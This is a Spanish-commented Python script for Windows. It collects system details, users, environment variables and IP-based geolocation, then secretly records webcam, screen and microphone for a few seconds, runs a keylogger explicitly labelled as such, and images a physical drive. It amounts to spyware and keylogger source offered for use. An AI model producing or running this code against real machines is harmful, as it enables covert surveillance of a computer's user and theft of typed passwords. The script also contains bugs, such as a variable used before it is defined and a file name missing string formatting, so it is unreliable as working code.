# Este es un codigo para extraer imagen de camara, imagen de pantalla y audio 
# Del entorno del computador windows
# El software y luego instalar las librerias de python
# pip install opencv-python mss numpy sounddevice scipy moviepy psutil wmi os platform hashlib pynput
import cv2
import numpy as np
import mss
import time
import sounddevice as sd
from scipy.io.wavfile import write as write_wav
from datetime import datetime
from moviepy.editor import VideoFileClip, AudioFileClip
import requests
import hashlib

import os
import platform
import socket
import subprocess
import psutil
import wmi
from datetime import datetime
import getpass

from pynput import keyboard
import time
import platform
from datetime import datetime


##############################
### DECLARACION DE VARIABLES
#########################

# Variables relacionados al proyecto
Duracion_Grabacion = 10  # segundos
Fps = 20
Tasa_Audio = 44100
Resolucion_Camara = (640, 480)
# Se calcula el tiempo inicial
Tiempo_Inicial = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')  # año-mes-día_hora-minuto-segundo

# Se guardan las variables de los nombres de archivos
archivo_camara = f"Camara_{Tiempo_Inicial}_{Ubicacion}.mp4"
archivo_pantalla = f"Pantalla_{Tiempo_Inicial}_{Ubicacion}.mp4"
archivo_audio = f"Audio_{Tiempo_Inicial}_{Ubicacion}.wav"
archivo_pantalla_con_audio = f"Pantalla_Audio_{Tiempo_Inicial}_{Ubicacion}.mp4"


respuesta = requests.get("https://ipinfo.io/json")
datos = respuesta.json()

print("(+) Ubicación aproximada:")
print(f"IP: {datos.get('ip')}")
print(f"Ciudad: {datos.get('city')}")
print(f"Región: {datos.get('region')}")
print(f"País: {datos.get('country')}")
print(f"Ubicación (lat,long): {datos.get('loc')}")
print(f"Organización: {datos.get('org')}")
print(f"Zona Horaria: {datos.get('timezone')}")
Ubicacion = datos.get('loc')



# Crear carpeta con nombre basado en hostname y fecha
hostname = socket.gethostname()
output_dir = f"Info_Windows_{hostname}_{Tiempo_Inicial}_{Ubicacion}"
os.makedirs(output_dir, exist_ok=True)

##############################
### FIN DE DECLARACION DE VARIABLES
#########################


##############################
### EXTRAER LA MAYOR CANTIDAD DE INFORMACION DEL WINDOWS
#########################
print("Se empieza a extraer la informacion general del dispositivo")
# Se guarda un archvio en la carpeta creada
def save_output(filename, content):
    with open(os.path.join(output_dir, filename), "w", encoding="utf-8") as f:
        f.write(content)

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, universal_newlines=True, stderr=subprocess.DEVNULL)
        return output.strip()
    except Exception as e:
        return f"Error ejecutando comando: {command}\n{e}"

# Obtener la informacion del sistema
def get_system_info():
    return f"""\
Nombre del equipo: {hostname}
Usuario actual: {getpass.getuser()}
Sistema operativo: {platform.system()} {platform.release()}
Versión: {platform.version()}
Arquitectura: {platform.machine()}
Procesador: {platform.processor()}
"""

# Obtener la informacion del cpu
def get_cpu_info():
    return f"""\
CPUs físicos: {psutil.cpu_count(logical=False)}
CPUs lógicos: {psutil.cpu_count(logical=True)}
Uso por núcleo (%): {psutil.cpu_percent(percpu=True, interval=1)}
"""
# Obtener Informacion de la memoria volatil
def get_memory_info():
    mem = psutil.virtual_memory()
    return f"""\
Memoria total: {mem.total // (1024 ** 2)} MB
Disponible: {mem.available // (1024 ** 2)} MB
Usada: {mem.used // (1024 ** 2)} MB
Porcentaje en uso: {mem.percent}%
"""

# Obtener Informacion de la memoria fisica
def get_disk_info():
    result = ""
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            result += f"""
Unidad: {part.device}
  Sistema de archivos: {part.fstype}
  Total: {usage.total // (1024 ** 3)} GB
  Usado: {usage.used // (1024 ** 3)} GB ({usage.percent}%)
"""
        except PermissionError:
            continue
    return result.strip()

# Obtener informacion de la red donde esta el windows
def get_network_info():
    result = ""
    for iface, addrs in psutil.net_if_addrs().items():
        result += f"\nInterfaz: {iface}\n"
        for addr in addrs:
            result += f"  {addr.family.name if hasattr(addr.family, 'name') else addr.family}: {addr.address}\n"
    return result.strip()

# Obtener los procesos del computador windows
def get_processes1():
    output = ""
    for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']):
        try:
            output += f"{proc.info['pid']:>5}  {proc.info['name'][:25]:<25}  {proc.info['username']:<20}  {proc.info['cpu_percent']}%\n"
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return output

def get_installed_programs():
    return run_command('wmic product get name,version')

def get_users():
    return run_command("net user")

def get_services():
    return run_command("sc query")

def get_bios_info():
    try:
        c = wmi.WMI()
        bios = c.Win32_BIOS()[0]
        return f"Fabricante: {bios.Manufacturer}\nVersión: {bios.SMBIOSBIOSVersion}\nFecha: {bios.ReleaseDate}"
    except Exception as e:
        return f"Error accediendo a la BIOS: {e}"

def get_env_variables():
    return "\n".join(f"{k}={v}" for k, v in os.environ.items())

def get_updates():
    return run_command("powershell Get-HotFix")

# En el main se ejecutan los comandos y se guardan en un txt el resultados


save_output("01_sistema.txt", get_system_info())
save_output("02_cpu.txt", get_cpu_info())
save_output("03_memoria.txt", get_memory_info())
save_output("04_disco.txt", get_disk_info())
save_output("05_red.txt", get_network_info())
save_output("06_procesos.txt", get_processes1())
save_output("07_programas.txt", get_installed_programs())
save_output("08_usuarios.txt", get_users())
save_output("09_servicios.txt", get_services())
save_output("10_bios.txt", get_bios_info())
save_output("11_entorno.txt", get_env_variables())
save_output("12_actualizaciones.txt", get_updates())

print(f"\n (+) Información guardada en la carpeta: {output_dir}")


##############################
### FIN DE EXTRAER LA MAYOR CANTIDAD DE INFORMACION DEN WINDOWS
#########################

##############################
### CODIGO DE GRABADO DE CAMARA, PANTALLA MICROFONO
#########################


# Se inicializa la camara
cam = cv2.VideoCapture(0)
cam.set(cv2.CAP_PROP_FRAME_WIDTH, Resolucion_Camara[0])
cam.set(cv2.CAP_PROP_FRAME_HEIGHT, Resolucion_Camara[1])

if not cam.isOpened():
    print("(-) No se pudo abrir la cámara")
    exit()

# Se organizan los datos de la camara
codec = cv2.VideoWriter_fourcc(*'mp4v')
out_camara = cv2.VideoWriter(archivo_camara, codec, Fps, Resolucion_Camara)

# Se graba el audio del windows
print("(+)(...) Guardando el audio...")
audio = sd.rec(int(Duracion_Grabacion * Tasa_Audio), samplerate=Tasa_Audio, channels=2)

# Se graba la pantalla mas la camara
with mss.mss() as sct:
    monitor = sct.monitors[1]  # pantalla completa principal
    screen_res = (monitor["width"], monitor["height"])
    out_pantalla = cv2.VideoWriter(archivo_pantalla, codec, Fps, screen_res)

    print("(+)(...) Guardando la imagen de camara y pantalla..")
    tiempo_inicio = time.time()

    while time.time() - tiempo_inicio < Duracion_Grabacion:
        # Se lee la camara
        ret, frame_cam = cam.read()
        if ret:
            out_camara.write(frame_cam)

        # Se lee la pantalla
        pantalla = np.array(sct.grab(monitor))
        frame_pantalla = cv2.cvtColor(pantalla, cv2.COLOR_BGRA2BGR)
        out_pantalla.write(frame_pantalla)

        time.sleep(1 / Fps)

# Guardar datos
sd.wait()
write_wav(archivo_audio, Tasa_Audio, audio)

# Inicializan librerias de guardar datos
cam.release()
out_camara.release()
out_pantalla.release()
cv2.destroyAllWindows()

# Se combina el audio con la imagen de la pantalla
print("(+)(...) Se esta combinando la imagen de la pantalla con el audio del microfono...")
video_clip = VideoFileClip(archivo_pantalla)
audio_clip = AudioFileClip(archivo_audio)
video_final = video_clip.set_audio(audio_clip)
video_final.write_videofile(archivo_pantalla_con_audio, codec='libx264', audio_codec='aac')


# Se muestra en pantalla los nombres de los archivos
print("\n(+) Grabación completada con éxito:")
print(f"(+) Archivo con imagen de Cámara:             {archivo_camara}")
print(f"(+) Archivo con imagen de pantalla:           {archivo_pantalla}")
print(f"(+) Archivo con pantalla + Audio:   {archivo_pantalla_con_audio}")



##########################
### FIN DE LA GRABACION DE CAMARA, PANTALLA Y MICROFONO
#######################



##############################
### CODIGO KEYLOGGER EN LA MAQUINA
#########################


# Duración en segundos
DURACION = 10

# En el siguiente codigo se muestra como obtener ubicacion de un dispositivo 
# guarda longitud y latititud del computador
def obtener_lat_lon():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        data = response.json()
        loc = data.get("loc", "")  # formato: "lat,lon"
        if loc:
            lat, lon = loc.split(",")
            return f"{lat}_{lon}"
        else:
            return "LatLon_Desconocida"
    except Exception:
        return "LatLon_Error"

# Se crean el archivo con los datos del keylogger
def crear_nombre_archivo():
    fecha_hora = datetime.now().strftime("%y%m%d_%H%M%S")
    lat_lon = obtener_lat_lon()
    return f"Keylogger_Windows_{fecha_hora}_{lat_lon}.txt"

# Lista para guardar los registros
registro_teclas = []

# Con el siguiente codigo se guarda tecla presionada
def on_press(key):
    Tiempo_Inicial = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)
    registro_teclas.append(f"[{Tiempo_Inicial}] {tecla}")

# Iniciar escucha
listener = keyboard.Listener(on_press=on_press)
listener.start()

print("(+) Se guardaran las teclas usadas por 10 sengundos..")
time.sleep(DURACION)
listener.stop()

# Guardar en archivo
nombre_archivo = crear_nombre_archivo()
with open(nombre_archivo, "w", encoding="utf-8") as f:
    f.write("Registro de teclas con fecha y hora:\n\n")
    for entrada in registro_teclas:
        f.write(entrada + "\n")

print(f"(+) Archivo con el informe keylogger se guardo como: {nombre_archivo}")


##############################
### FIN DE CODIGO KEYLOGGER EN LA MAQUINA
#########################




##########################
### COPIA DEL DISCO DURO
#######################

def copia_forense_a_iso(origen, salida_iso, tamano_bloque=4096):
    try:
        hash_sha256 = hashlib.sha256()
        total_bytes = 0

        with open(origen, 'rb') as disco_origen, open(salida_iso, 'wb') as archivo_iso:
            print(f"Iniciando copia forense desde {origen} a {salida_iso}...")
            while True:
                bloque = disco_origen.read(tamano_bloque)
                if not bloque:
                    break
                archivo_iso.write(bloque)
                hash_sha256.update(bloque)
                total_bytes += len(bloque)
                print(f"\rCopiados {total_bytes} bytes...", end='', flush=True)

        print("\nCopia finalizada.")
        print(f"Hash SHA256 de la imagen: {hash_sha256.hexdigest()}")

    except PermissionError:
        print("Permiso denegado. Ejecuta este script como administrador o root.")
    except FileNotFoundError:
        print("Dispositivo o archivo no encontrado.")
    except Exception as e:
        print(f"Error durante la copia: {e}")

# Ejemplo de uso:
# En Linux: copia_forense_a_iso("/dev/sdb", "imagen_forense.iso")
copia_forense_a_iso(r"\\.\PhysicalDrive1", "Disco_Duro_{Tiempo_Inicial}_{Ubicacion}.iso")

##########################
### FIN DE COPIA DEL DISCO DURO
#######################




